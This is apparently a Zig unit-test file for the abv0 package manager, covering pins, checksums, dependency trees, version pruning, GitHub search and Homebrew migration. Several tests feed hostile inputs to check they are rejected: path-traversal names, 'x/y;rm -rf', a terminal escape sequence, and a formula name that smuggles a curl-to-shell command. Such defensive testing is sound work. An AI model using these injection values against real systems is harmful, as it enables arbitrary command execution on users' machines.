    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);

    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);

    try testing.expect(!isPinned(&st, aa, "ripgrep"));

    try testing.expectEqual(@as(u8, 0), try cmdPin(aa, &st, null, &.{"ripgrep"}));
    try testing.expectEqual(@as(u8, 0), try cmdPin(aa, &st, null, &.{"jq"}));
    // Pinning twice is harmless and leaves a single line.
    try testing.expectEqual(@as(u8, 0), try cmdPin(aa, &st, null, &.{"ripgrep"}));
    try testing.expect(isPinned(&st, aa, "ripgrep"));
    try testing.expect(isPinned(&st, aa, "jq"));
    try testing.expect(!isPinned(&st, aa, "fd"));

    const listed = try readPins(aa, &st);
    try testing.expectEqual(@as(usize, 2), listed.len);
    try testing.expectEqualStrings("ripgrep", listed[0]);
    try testing.expectEqualStrings("jq", listed[1]);

    try testing.expectEqual(@as(u8, 0), try cmdUnpin(aa, &st, null, &.{"ripgrep"}));
    try testing.expect(!isPinned(&st, aa, "ripgrep"));
    try testing.expect(isPinned(&st, aa, "jq"));
    try testing.expectEqual(@as(u8, 1), try cmdUnpin(aa, &st, null, &.{"ripgrep"}));

    try testing.expectEqual(@as(u8, 0), try cmdUnpin(aa, &st, null, &.{"jq"}));
    try testing.expectEqual(@as(usize, 0), (try readPins(aa, &st)).len);
    try testing.expectEqual(@as(u8, 0), try cmdPinned(aa, &st, null, &.{}));
}

test "pin rejects invalid names and usage errors" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);

    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);

    try testing.expectEqual(@as(u8, 2), try cmdPin(aa, &st, null, &.{}));
    try testing.expectEqual(@as(u8, 2), try cmdPin(aa, &st, null, &.{"../evil"}));
    try testing.expectEqual(@as(u8, 2), try cmdUnpin(aa, &st, null, &.{}));
    try testing.expectEqual(@as(u8, 1), try cmdUnpin(aa, &st, null, &.{"never-pinned"}));
}

test "completions output for each shell is non-empty and lists install" {
    for ([_][]const u8{ "bash", "zsh", "fish", "pwsh" }) |shell| {
        const script = completionScript(shell) orelse return error.TestUnexpectedResult;
        try testing.expect(script.len > 0);
        try testing.expect(std.mem.indexOf(u8, script, "install") != null);
        try testing.expect(std.mem.indexOf(u8, script, "self-update") != null);
    }
    try testing.expect(completionScript("tcsh") == null);
}

test "asset name for each of the six release targets" {
    try testing.expectEqualStrings("abv0-linux-x86_64", assetName(.linux, .x86_64).?);
    try testing.expectEqualStrings("abv0-linux-aarch64", assetName(.linux, .aarch64).?);
    try testing.expectEqualStrings("abv0-darwin-x86_64", assetName(.macos, .x86_64).?);
    try testing.expectEqualStrings("abv0-darwin-arm64", assetName(.macos, .aarch64).?);
    try testing.expectEqualStrings("abv0-windows-x86_64.exe", assetName(.windows, .x86_64).?);
    try testing.expectEqualStrings("abv0-windows-aarch64.exe", assetName(.windows, .aarch64).?);
    try testing.expect(assetName(.linux, .riscv64) == null);
    try testing.expect(assetName(.freebsd, .x86_64) == null);
}

test "SHA256SUMS line parser" {
    const h1 = "ab" ** 32;
    const h2 = "cd" ** 32;
    const sums = "ad20fb96f737fc34b61f3be524618853294c153842861604ac6ae7d3fd7a762c  abv0-darwin-arm64\n" ++
        h1 ++ "  abv0-linux-x86_64\r\n" ++
        h2 ++ " *abv0-windows-x86_64.exe\n" ++
        "abcd  abv0-linux-aarch64\n";

    try testing.expectEqualStrings(h1, findChecksum(sums, "abv0-linux-x86_64").?);
    try testing.expectEqualStrings(h2, findChecksum(sums, "abv0-windows-x86_64.exe").?);
    try testing.expectEqualStrings("ad20fb96f737fc34b61f3be524618853294c153842861604ac6ae7d3fd7a762c", findChecksum(sums, "abv0-darwin-arm64").?);
    // A short or non-hex digest is refused, not passed through.
    try testing.expect(findChecksum(sums, "abv0-linux-aarch64") == null);
    // Names are matched exactly, not by prefix.
    try testing.expect(findChecksum(sums, "abv0-linux") == null);
    try testing.expect(findChecksum(sums, "abv0-darwin-x86_64") == null);
}

// ---------------------------------------------------------------------------
// Tests: deps, uses, leaves, versions, online search, migrate
// ---------------------------------------------------------------------------

/// A registry over `pkgs` (which must be sorted by name).
fn testRegistry(pkgs: []registry.Package) registry.Registry {
    return .{ .allocator = testing.allocator, .packages = pkgs };
}

test "collectDeps lists each dependency once, dependencies first, root excluded" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    // app -> lib, tool; lib -> base; tool -> base, ghost (not in the catalog)
    var pkgs = [_]registry.Package{
        .{ .name = "app", .version = "1", .deps = &.{ "lib", "tool" } },
        .{ .name = "base", .version = "1" },
        .{ .name = "lib", .version = "1", .deps = &.{"base"} },
        .{ .name = "tool", .version = "1", .deps = &.{ "base", "ghost" } },
    };
    const reg = testRegistry(&pkgs);
    const deps = try collectDeps(arena.allocator(), &reg, "app");
    try testing.expectEqual(@as(usize, 4), deps.len);
    try testing.expectEqualStrings("base", deps[0]);
    try testing.expectEqualStrings("lib", deps[1]);
    try testing.expectEqualStrings("ghost", deps[2]);
    try testing.expectEqualStrings("tool", deps[3]);
    try testing.expectEqual(@as(usize, 0), (try collectDeps(arena.allocator(), &reg, "base")).len);
}

test "collectDeps survives a dependency cycle" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    var pkgs = [_]registry.Package{
        .{ .name = "a", .version = "1", .deps = &.{"b"} },
        .{ .name = "b", .version = "1", .deps = &.{"a"} },
    };
    const reg = testRegistry(&pkgs);
    const deps = try collectDeps(arena.allocator(), &reg, "a");
    try testing.expectEqual(@as(usize, 1), deps.len);
    try testing.expectEqualStrings("b", deps[0]);
}

test "deps tree marks repeated, unknown and cyclic dependencies" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    var pkgs = [_]registry.Package{
        .{ .name = "app", .version = "1", .deps = &.{ "lib", "tool" } },
        .{ .name = "base", .version = "1", .deps = &.{"lib"} },
        .{ .name = "lib", .version = "1", .deps = &.{"base"} },
        .{ .name = "tool", .version = "1", .deps = &.{ "base", "ghost" } },
    };
    const reg = testRegistry(&pkgs);

    var buf = std.ArrayList(u8).init(testing.allocator);
    defer buf.deinit();
    try writeDepsTree(buf.writer(), arena.allocator(), &reg, pkgs[0]);
    const expected =
        "app\n" ++
        "\xe2\x94\x9c\xe2\x94\x80\xe2\x94\x80 lib\n" ++
        "\xe2\x94\x82   \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 base\n" ++
        "\xe2\x94\x82       \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 lib (cycle)\n" ++
        "\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 tool\n" ++
        "    \xe2\x94\x9c\xe2\x94\x80\xe2\x94\x80 base (*)\n" ++
        "    \xe2\x94\x94\xe2\x94\x80\xe2\x94\x80 ghost (not in the catalog)\n";
    try testing.expectEqualStrings(expected, buf.items);
}

test "deps JSON is parseable: flat list and nested tree" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var pkgs = [_]registry.Package{
        .{ .name = "app", .version = "1.0", .deps = &.{ "lib", "ghost" } },
        .{ .name = "lib", .version = "2.0" },
    };
    const reg = testRegistry(&pkgs);

    var flat = std.ArrayList(u8).init(testing.allocator);
    defer flat.deinit();
    try writeDepsFlatJson(flat.writer(), "app", try collectDeps(aa, &reg, "app"));
    const f = try std.json.parseFromSliceLeaky(std.json.Value, aa, flat.items, .{});
    try testing.expectEqualStrings("app", f.object.get("package").?.string);
    try testing.expectEqual(@as(usize, 2), f.object.get("dependencies").?.array.items.len);

    var tree = std.ArrayList(u8).init(testing.allocator);
    defer tree.deinit();
    try writeDepsTreeJson(tree.writer(), aa, &reg, pkgs[0]);
    const t = try std.json.parseFromSliceLeaky(std.json.Value, aa, tree.items, .{});
    const kids = t.object.get("deps").?.array.items;
    try testing.expectEqualStrings("lib", kids[0].object.get("name").?.string);
    try testing.expectEqualStrings("2.0", kids[0].object.get("version").?.string);
    try testing.expect(!kids[1].object.get("in_catalog").?.bool);
}

test "uses and leaves read the installed set against the registry's deps" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var pkgs = [_]registry.Package{
        .{ .name = "app", .version = "1", .deps = &.{ "base", "lib" } },
        .{ .name = "base", .version = "1" },
        .{ .name = "lib", .version = "1", .deps = &.{"base"} },
        .{ .name = "other", .version = "1", .deps = &.{"lib"} },
    };
    const reg = testRegistry(&pkgs);
    // `other` is in the catalog but not installed; `tool` is a GitHub install.
    const installed = [_]InstalledPkg{
        .{ .name = "app", .version = "1" },
        .{ .name = "base", .version = "1" },
        .{ .name = "lib", .version = "1" },
        .{ .name = "tool", .version = "9" },
    };

    const users = try dependentsOf(aa, &reg, &installed, "base");
    try testing.expectEqual(@as(usize, 2), users.len);
    try testing.expectEqualStrings("app", users[0].name);
    try testing.expectEqualStrings("lib", users[1].name);
    try testing.expectEqual(@as(usize, 0), (try dependentsOf(aa, &reg, &installed, "app")).len);
    // `other` is not installed, so it does not count as a user of lib.
    try testing.expectEqual(@as(usize, 1), (try dependentsOf(aa, &reg, &installed, "lib")).len);

    const leaves = try leavesOf(aa, &reg, &installed);
    try testing.expectEqual(@as(usize, 2), leaves.len);
    try testing.expectEqualStrings("app", leaves[0].name);
    try testing.expectEqualStrings("tool", leaves[1].name);
}

test "planPrune keeps the new version and the one just before it" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();

    // Upgrading 1.9 -> 1.10: 1.8 and 1.2 go, 1.9 stays for rollback.
    const v = [_][]const u8{ "1.2", "1.9", "1.10", "1.8" };
    const gone = try planPrune(aa, &v, "1.10");
    try testing.expectEqualSlices(usize, &.{ 0, 3 }, gone);

    // Only the new version: nothing to delete.
    const one = [_][]const u8{"2.0"};
    try testing.expectEqual(@as(usize, 0), (try planPrune(aa, &one, "2.0")).len);

    // A version newer than the one just installed is not "previous"; it goes.
    const odd = [_][]const u8{ "3.0", "1.0", "2.0" };
    try testing.expectEqualSlices(usize, &.{0}, try planPrune(aa, &odd, "2.0"));
}

test "findVersion, activeIndex and previousIndex" {
    const rows = [_]VersionRow{
        .{ .version = "1.6", .dir_name = "jq@1.6@x" },
        .{ .version = "1.7.1", .dir_name = "jq@1.7.1@x", .active = true },
        .{ .version = "1.8", .dir_name = "jq@1.8@x" },
    };
    try testing.expectEqual(@as(?usize, 0), findVersion(&rows, "1.6"));
    try testing.expectEqual(@as(?usize, 1), findVersion(&rows, "v1.7.1"));
    try testing.expectEqual(@as(?usize, null), findVersion(&rows, "1.5"));
    try testing.expectEqual(@as(?usize, 1), activeIndex(&rows));
    try testing.expectEqual(@as(?usize, 0), previousIndex(&rows));

    // Active version is the oldest: nothing to roll back to.
    const oldest = [_]VersionRow{
        .{ .version = "1.0", .dir_name = "a", .active = true },
        .{ .version = "2.0", .dir_name = "b" },
    };
    try testing.expectEqual(@as(?usize, null), previousIndex(&oldest));

    // No link matched any version: the newest counts as active.
    const unknown = [_]VersionRow{
        .{ .version = "1.0", .dir_name = "a" },
        .{ .version = "2.0", .dir_name = "b" },
    };
    try testing.expectEqual(@as(?usize, null), activeIndex(&unknown));
    try testing.expectEqual(@as(?usize, 0), previousIndex(&unknown));
    try testing.expectEqual(@as(?usize, null), previousIndex(&.{}));
}

fn writeTestFile(dir: std.fs.Dir, path: []const u8, data: []const u8) !void {
    if (std.fs.path.dirname(path)) |d| try dir.makePath(d);
    try dir.writeFile(.{ .sub_path = path, .data = data });
}

test "listVersions finds the active version through a hard link, and survives a switch" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);

    try writeTestFile(tmp.dir, "store/jq@1.6@x86_64-linux/jq", "old binary");
    try writeTestFile(tmp.dir, "store/jq@1.7.1@x86_64-linux/jq", "new binary, longer");
    try writeTestFile(tmp.dir, "store/jq-extra@9@x86_64-linux/jq-extra", "other package");
    try tmp.dir.makePath("bin");

    const old_src = try std.fs.path.join(aa, &.{ root, "store/jq@1.6@x86_64-linux/jq" });
    const new_src = try std.fs.path.join(aa, &.{ root, "store/jq@1.7.1@x86_64-linux/jq" });
    const dst = try std.fs.path.join(aa, &.{ root, "bin/jq" });

    _ = try platform.fastLink(new_src, dst);
    var rows = try listVersions(aa, &st, "jq", "x86_64-linux");
    try testing.expectEqual(@as(usize, 2), rows.len);
    try testing.expectEqualStrings("1.6", rows[0].version);
    try testing.expectEqualStrings("1.7.1", rows[1].version);
    try testing.expect(!rows[0].active and rows[1].active);

    // What `switch` does: the link moves to the other version's file.
    _ = try platform.fastLink(old_src, dst);
    rows = try listVersions(aa, &st, "jq", "x86_64-linux");
    try testing.expect(rows[0].active and !rows[1].active);
    try testing.expectEqual(@as(?usize, 0), activeIndex(rows));
    try testing.expectEqual(@as(?usize, null), previousIndex(rows));

    // A package with no link at all has no active version.
    const other = try listVersions(aa, &st, "jq-extra", "x86_64-linux");
    try testing.expectEqual(@as(usize, 1), other.len);
    try testing.expect(!other[0].active);
}

test "cleanup keeps an older version that a rollback made active" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);

    try writeTestFile(tmp.dir, "store/jq@1.5@x86_64-linux/jq", "ancient");
    try writeTestFile(tmp.dir, "store/jq@1.6@x86_64-linux/jq", "previous kept");
    try writeTestFile(tmp.dir, "store/jq@1.7@x86_64-linux/jq", "newest");
    try tmp.dir.makePath("bin");
    // Rolled back to 1.6.
    _ = try platform.fastLink(try std.fs.path.join(aa, &.{ root, "store/jq@1.6@x86_64-linux/jq" }), try std.fs.path.join(aa, &.{ root, "bin/jq" }));

    var plan = std.ArrayList(Victim).init(aa);
    try collectOldVersions(aa, &st, &plan);
    try testing.expectEqual(@as(usize, 1), plan.items.len);
    try testing.expect(std.mem.indexOf(u8, plan.items[0].label, "1.5") != null);
}

test "pruneKeepingPrevious deletes all but the new and the previous version" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);

    for ([_][]const u8{ "1.0", "1.1", "1.2", "1.3" }) |v| {
        const p = try std.fmt.allocPrint(aa, "store/jq@{s}@x86_64-linux/jq", .{v});
        try writeTestFile(tmp.dir, p, v);
    }
    try writeTestFile(tmp.dir, "store/jq@1.3@aarch64-linux/jq", "other platform");

    const n = try pruneKeepingPrevious(aa, &st, "jq", "1.3", "x86_64-linux");
    try testing.expectEqual(@as(usize, 2), n);
    try tmp.dir.access("store/jq@1.3@x86_64-linux/jq", .{});
    try tmp.dir.access("store/jq@1.2@x86_64-linux/jq", .{});
    try testing.expectError(error.FileNotFound, tmp.dir.access("store/jq@1.1@x86_64-linux/jq", .{}));
    try testing.expectError(error.FileNotFound, tmp.dir.access("store/jq@1.0@x86_64-linux/jq", .{}));
    // Another platform's directory is not touched.
    try tmp.dir.access("store/jq@1.3@aarch64-linux/jq", .{});
    try testing.expectError(store.StoreError.InvalidPackageIdentifier, pruneKeepingPrevious(aa, &st, "../x", "1", "x86_64-linux"));
}

test "installedPackages reads the newest version per package for one platform" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);

    try tmp.dir.makePath("store/jq@1.9@x86_64-linux");
    try tmp.dir.makePath("store/jq@1.10@x86_64-linux");
    try tmp.dir.makePath("store/fd@9.0@x86_64-linux");
    try tmp.dir.makePath("store/fd@9.0@aarch64-linux");
    try tmp.dir.makePath("store/rg@1@aarch64-linux");
    try tmp.dir.makePath("store/jq@1.9@x86_64-linux.tmp");

    const list = try installedPackages(aa, &st, "x86_64-linux");
    try testing.expectEqual(@as(usize, 2), list.len);
    try testing.expectEqualStrings("fd", list[0].name);
    try testing.expectEqualStrings("jq", list[1].name);
    try testing.expectEqualStrings("1.10", list[1].version);
}

const search_fixture =
    \\{"total_count": 3, "incomplete_results": false, "items": [
    \\ {"full_name": "BurntSushi/ripgrep", "stargazers_count": 48000, "description": "recursively \u001b[2Jsearches"},
    \\ {"full_name": "someone/no-description", "stargazers_count": 7, "description": null},
    \\ {"full_name": "../../evil", "stargazers_count": 1, "description": "bad name"},
    \\ {"full_name": "a/b/c", "stargazers_count": 1, "description": "too many parts"},
    \\ {"full_name": "x/y;rm -rf", "stargazers_count": 1, "description": "shell"},
    \\ {"stargazers_count": 1, "description": "no name"}
    \\]}
;

test "parseSearchResults keeps well-formed repositories and drops hostile names" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    var msg: ?[]const u8 = null;
    const repos = try parseSearchResults(arena.allocator(), search_fixture, &msg);
    try testing.expectEqual(@as(usize, 2), repos.len);
    try testing.expectEqualStrings("BurntSushi/ripgrep", repos[0].full_name);
    try testing.expectEqual(@as(u64, 48000), repos[0].stars);
    // Control bytes survive parsing; the printer is what neutralises them.
    try testing.expect(std.mem.indexOfScalar(u8, repos[0].description, 0x1b) != null);
    try testing.expectEqualStrings("someone/no-description", repos[1].full_name);
    try testing.expectEqualStrings("", repos[1].description);
    try testing.expect(msg == null);
}

test "parseSearchResults reports GitHub's message and rejects non-search JSON" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var msg: ?[]const u8 = null;
    try testing.expectError(error.GitHubApiMessage, parseSearchResults(aa, "{\"message\":\"API rate limit exceeded\"}", &msg));
    try testing.expectEqualStrings("API rate limit exceeded", msg.?);
    try testing.expectError(error.BadResponse, parseSearchResults(aa, "[1,2]", &msg));
    try testing.expectError(error.BadResponse, parseSearchResults(aa, "not json", &msg));
    try testing.expectError(error.BadResponse, parseSearchResults(aa, "{\"items\":5}", &msg));
    try testing.expectEqual(@as(usize, 0), (try parseSearchResults(aa, "{\"items\":[]}", &msg)).len);
}

test "searchUrl encodes the query and asks for ten results by stars" {
    const url = try searchUrl(testing.allocator, "my tool&x=1");
    defer testing.allocator.free(url);
    try testing.expectEqualStrings(
        "https://api.github.com/search/repositories?q=my%20tool%26x%3D1+in:name&sort=stars&per_page=10",
        url,
    );
    try testing.expect(net.isSafeUrl(url));
}

test "parseNames reads a plain brew list" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const text = "jq\nripgrep\r\n\n# comment\nhomebrew/core/fd\njq\nopenssl@3\n7zip\n";
    const names = try parseNames(arena.allocator(), text, .list);
    try testing.expectEqual(@as(usize, 5), names.len);
    try testing.expectEqualStrings("jq", names[0]);
    try testing.expectEqualStrings("ripgrep", names[1]);
    try testing.expectEqualStrings("fd", names[2]);
    try testing.expectEqualStrings("openssl@3", names[3]);
    try testing.expectEqualStrings("7zip", names[4]);
}

test "parseNames takes the name from `brew list --versions` lines" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const names = try parseNames(arena.allocator(), "jq 1.7.1\nopenssl@3 3.3.1 3.2.0\nbat 0.24.0_1\n", .list);
    try testing.expectEqual(@as(usize, 3), names.len);
    try testing.expectEqualStrings("jq", names[0]);
    try testing.expectEqualStrings("openssl@3", names[1]);
    try testing.expectEqualStrings("bat", names[2]);
}

test "parseNames reads only brew lines of a Brewfile" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const text =
        \\# my machine
        \\tap "homebrew/cask"
        \\brew "jq"
        \\brew 'ripgrep', args: ["HEAD"]
        \\  brew "user/tap/tool"  # trailing
        \\cask "firefox"
        \\mas "Xcode", id: 497799835
        \\brewery "nope"
        \\brew
        \\brew "unterminated
        \\brew "jq"
        \\vscode "ms-python.python"
    ;
    const names = try parseNames(arena.allocator(), text, .brewfile);
    try testing.expectEqual(@as(usize, 3), names.len);
    try testing.expectEqualStrings("jq", names[0]);
    try testing.expectEqualStrings("ripgrep", names[1]);
    try testing.expectEqualStrings("tool", names[2]);
}

test "matchName tries the name, then an executable, then drops an @version" {
    var pkgs = [_]registry.Package{
        .{ .name = "jq", .version = "1", .bin = &.{"jq"} },
        .{ .name = "python", .version = "3", .bin = &.{ "python3", "pip3" } },
        .{ .name = "ripgrep", .version = "14", .bin = &.{"rg"} },
    };
    const reg = testRegistry(&pkgs);

    const exact = matchName(&reg, "jq").?;
    try testing.expectEqualStrings("jq", exact.pkg.name);
    try testing.expectEqual(Via.exact, exact.via);

    const by_bin = matchName(&reg, "rg").?;
    try testing.expectEqualStrings("ripgrep", by_bin.pkg.name);
    try testing.expectEqual(Via.bin, by_bin.via);

    const versioned = matchName(&reg, "python@3.12").?;
    try testing.expectEqualStrings("python", versioned.pkg.name);
    try testing.expectEqual(Via.unversioned, versioned.via);

    const vbin = matchName(&reg, "rg@2").?;
    try testing.expectEqual(Via.unversioned_bin, vbin.via);

    try testing.expect(matchName(&reg, "wget") == null);
    try testing.expect(matchName(&reg, "@3") == null);
}

test "safe replaces control bytes and keeps width" {
    const out = try std.fmt.allocPrint(testing.allocator, "[{:<5}]", .{safe("a\x1bb")});
    defer testing.allocator.free(out);
    try testing.expectEqualStrings("[a?b  ]", out);
}

test "listVersions falls back to comparing bytes when a bin is a copy or a clone" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);

    try writeTestFile(tmp.dir, "store/jq@1.6@x86_64-linux/jq", "same size A");
    try writeTestFile(tmp.dir, "store/jq@1.7@x86_64-linux/jq", "same size B");
    // A separate file with the bytes of 1.7: no shared inode, no symlink.
    try writeTestFile(tmp.dir, "bin/jq", "same size B");

    const rows = try listVersions(aa, &st, "jq", "x86_64-linux");
    try testing.expect(!rows[0].active);
    try testing.expect(rows[1].active);

    var plan = std.ArrayList(Victim).init(aa);
    try collectOldVersions(aa, &st, &plan);
    // 1.6 is old and unused; 1.7 is the newest anyway.
    try testing.expectEqual(@as(usize, 1), plan.items.len);
}

test "relinkGithub moves the bin link between installed GitHub versions; ownedBins reports it" {
    if (builtin.os.tag == .windows) return error.SkipZigTest;
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);

    // Raw single-file installs, as `gh:` leaves them.
    try writeTestFile(tmp.dir, "store/tool@1.0@x86_64-linux/tool", "#!/bin/sh\necho one\n");
    try writeTestFile(tmp.dir, "store/tool@1.0@x86_64-linux/.abv0-source", "gh:acme/tool@v1.0\n");
    try writeTestFile(tmp.dir, "store/tool@2.0@x86_64-linux/tool", "#!/bin/sh\necho two, longer\n");
    try writeTestFile(tmp.dir, "store/tool@2.0@x86_64-linux/.abv0-source", "gh:acme/tool@v2.0\n");
    try tmp.dir.makePath("bin");
    try tmp.dir.makePath("locks");
    const opts = store.InstallOptions{ .quiet = true };

    try testing.expectEqual(@as(usize, 1), try st.relinkGithub(aa, "tool", "1.0", "x86_64-linux", opts));
    var rows = try listVersions(aa, &st, "tool", "x86_64-linux");
    try testing.expect(rows[0].active and !rows[1].active);

    try testing.expectEqual(@as(usize, 1), try st.relinkGithub(aa, "tool", "2.0", "x86_64-linux", opts));
    rows = try listVersions(aa, &st, "tool", "x86_64-linux");
    try testing.expect(!rows[0].active and rows[1].active);

    const bins = try st.ownedBins(aa, "tool");
    try testing.expectEqual(@as(usize, 1), bins.len);
    try testing.expectEqualStrings("tool", bins[0]);
    try testing.expectEqual(@as(usize, 0), (try st.ownedBins(aa, "other")).len);

    // A version that is not in the store cannot be linked, and nothing moves.
    try testing.expectError(store.StoreError.ExecutableNotFound, st.relinkGithub(aa, "tool", "9.9", "x86_64-linux", opts));
    rows = try listVersions(aa, &st, "tool", "x86_64-linux");
    try testing.expect(rows[1].active);
}

test "receiptRequested reads only installed_on_request" {
    try testing.expectEqual(@as(?bool, true), receiptRequested("{\n  \"homebrew_version\": \"4.4\",\n  \"installed_on_request\": true,\n}"));
    try testing.expectEqual(@as(?bool, false), receiptRequested("{\"installed_as_dependency\":true,\"installed_on_request\":false}"));
    try testing.expectEqual(@as(?bool, null), receiptRequested("{\"installed_on_request\": null}"));
    try testing.expectEqual(@as(?bool, null), receiptRequested("{}"));
}

test "brewPrefixes: HOMEBREW_PREFIX alone, else the usual places" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    const one = try brewPrefixes(aa, "/x/brew", "/home/u");
    try testing.expectEqual(@as(usize, 1), one.len);
    try testing.expectEqualStrings("/x/brew", one[0]);
    const all = try brewPrefixes(aa, null, "/home/u");
    try testing.expectEqualStrings("/opt/homebrew", all[0]);
    const linuxbrew = try std.fs.path.join(aa, &.{ "/home/u", ".linuxbrew" });
    try testing.expectEqualStrings(linuxbrew, all[all.len - 1]);
}

test "scanBrew reads formulae, receipts, pins and casks from disk" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const d = tmp.dir;
    try d.makePath("Cellar/jq/1.7.1");
    try d.writeFile(.{ .sub_path = "Cellar/jq/1.7.1/INSTALL_RECEIPT.json", .data = "{\"installed_on_request\": true}" });
    try d.makePath("Cellar/oniguruma/6.9.9");
    try d.writeFile(.{ .sub_path = "Cellar/oniguruma/6.9.9/INSTALL_RECEIPT.json", .data = "{\"installed_on_request\": false}" });
    // No receipt: counts as installed by hand.
    try d.makePath("Cellar/ripgrep/14.1.0");
    try d.makePath("Cellar/.hidden");
    try d.makePath("var/homebrew/pinned");
    try d.writeFile(.{ .sub_path = "var/homebrew/pinned/ripgrep", .data = "" });
    try d.makePath("Caskroom/wezterm/2024");

    const root = try d.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const items = (try scanBrew(arena.allocator(), root)).?;

    try testing.expectEqual(@as(usize, 4), items.len);
    try testing.expectEqualStrings("jq", items[0].name);
    try testing.expect(items[0].requested and !items[0].pinned and items[0].kind == .formula);
    try testing.expectEqualStrings("oniguruma", items[1].name);
    try testing.expect(!items[1].requested);
    try testing.expectEqualStrings("ripgrep", items[2].name);
    try testing.expect(items[2].requested and items[2].pinned);
    try testing.expectEqualStrings("wezterm", items[3].name);
    try testing.expect(items[3].kind == .cask and items[3].requested);

    // A folder without Cellar or Caskroom is not a Homebrew.
    try d.makePath("empty");
    const empty = try d.realpathAlloc(testing.allocator, "empty");
    defer testing.allocator.free(empty);
    try testing.expect((try scanBrew(arena.allocator(), empty)) == null);
}

test "addPins adds each name once" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const aa = arena.allocator();
    var st = try testStore(aa, root);
    try testing.expectEqual(@as(usize, 2), try addPins(aa, &st, &.{ "jq", "fd", "jq" }));
    try testing.expectEqual(@as(usize, 0), try addPins(aa, &st, &.{"fd"}));
    try testing.expect(isPinned(&st, aa, "jq") and isPinned(&st, aa, "fd"));
}

test "versionFromOutput reads the --version line" {
    try testing.expectEqualStrings("2.6.0", versionFromOutput("abv0 2.6.0 (x86_64-linux)\n").?);
    try testing.expectEqualStrings("3.0.0", versionFromOutput("abv0 3.0.0").?);
    try testing.expect(versionFromOutput("evil 9.9.9\n") == null);
    try testing.expect(versionFromOutput("abv0 (x)\n") == null);
    try testing.expect(versionFromOutput("") == null);
}

test "isShellWord takes formula names and nothing a shell would act on" {
    try testing.expect(isShellWord("python@3.12"));
    try testing.expect(isShellWord("gtk+3"));
    try testing.expect(!isShellWord("jq@;curl$IFS-s$IFS//x|sh"));
    try testing.expect(!isShellWord("a`b`"));
    try testing.expect(!isShellWord(""));
}
